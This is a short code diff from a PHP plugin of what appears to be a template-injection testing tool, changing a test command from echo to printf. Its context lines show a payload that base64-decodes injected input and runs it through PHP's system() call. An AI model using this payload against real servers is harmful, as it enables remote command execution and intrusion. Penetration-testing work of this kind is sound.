@@ -48,7 +48,7 @@ class Php(Plugin):
             'execute' : {
                 'call': 'evaluate',
                 'execute': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%%4,'=',STR_PAD_RIGHT)));""",
-                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd': bash.printf % { 's1': rand.randstrings[2] },
                 'test_cmd_expected': rand.randstrings[2] 
             },
             'blind' : {
